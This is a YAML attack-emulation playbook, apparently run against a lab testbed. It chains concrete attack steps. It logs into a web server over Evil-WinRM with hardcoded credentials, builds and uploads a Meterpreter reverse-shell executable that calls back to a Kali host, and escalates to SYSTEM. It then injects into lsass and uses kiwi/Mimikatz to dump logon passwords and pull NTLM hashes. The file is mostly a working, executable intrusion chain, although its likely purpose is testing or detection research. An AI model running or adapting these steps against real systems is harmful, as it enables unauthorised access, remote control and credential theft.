vars:
  DOMAIN: aecid-testbed.com
  COMPROMISED_USER_USERNAME: Alice
  COMPROMISED_USER_PASSWORD: Pa$$w0rd
  COMPROMISED_ADMIN_USERNAME: "wsadmin"
  COMPROMISED_ADMIN_PASSWORD: "Root.PW1"
  IP_KALI: 10.10.10.200
  IP_WEB: 10.10.10.10
  IP_DC1: 10.0.0.10
  PAYLOADS_DIR: /home/superuser/payloads
  MSF_PAYLOAD: windows/x64/meterpreter/reverse_tcp

commands:
  - type: shell
    cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
    command_timeout: 30
    interactive: true
    creates_session: winrm
    metadata:
      techniques: "T1021.006,T1047"
      tactics: "Lateral Movement"
      technique_name: "Remote Services: Windows Remote Management"

  - type: msf-payload
    cmd: $MSF_PAYLOAD
    payload_options:
        LHOST: $IP_KALI
        LPORT: "9001"
    format: exe
    local_path: $PAYLOADS_DIR/msf.exe

  - type: shell
    session: winrm
    cmd: "mkdir C:\\\\Temp\n"
    interactive: true

  - type: shell
    session: winrm
    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Temp\\\\msf.exe\n"
    interactive: true

  - type: msf-module
    creates_session: msfshell
    cmd: exploit/multi/handler
    payload: $MSF_PAYLOAD
    payload_options:
      LHOST: $IP_KALI
      LPORT: "9001"
    background: true
    kill_on_exit: true

  - type: shell
    session: winrm
    cmd: "C:\\\\Temp\\\\msf.exe\n"
    interactive: true

  - type: msf-session
    session: msfshell
    cmd: getuid

  - type: msf-session
    session: msfshell
    cmd: pgrep lsass

  - type: setvar
    cmd: $RESULT_STDOUT
    variable: $LSASS_PID

  - type: msf-session
    session: msfshell
    cmd: getsystem

  - type: msf-session
    session: msfshell
    cmd: getuid

  - type: msf-session
    session: msfshell
    cmd: migrate $LSASS_PID
    metadata:
      techniques: "T1055"
      tactics: "Defense Evasion, Privilege Escalation"
      technique_name: "Process Injection"

  - type: sleep
    seconds: 10

  - type: msf-session
    session: msfshell
    cmd: getpid

  - type: msf-session
    session: msfshell
    cmd: load kiwi

  - type: msf-session
    session: msfshell
    cmd: "kiwi_cmd \"privilege::debug\""

  - type: msf-session
    session: msfshell
    cmd: "kiwi_cmd \"sekurlsa::logonpasswords\""
    metadata:
      techniques: "T1003.001"
      tactics: "Credential Access"
      technique_name: "OS Credential Dumping: LSASS Memory"

  - type: regex
    cmd: ".*NTLM.*:(.*)"
    output:
      NTLM: "$MATCH_0"
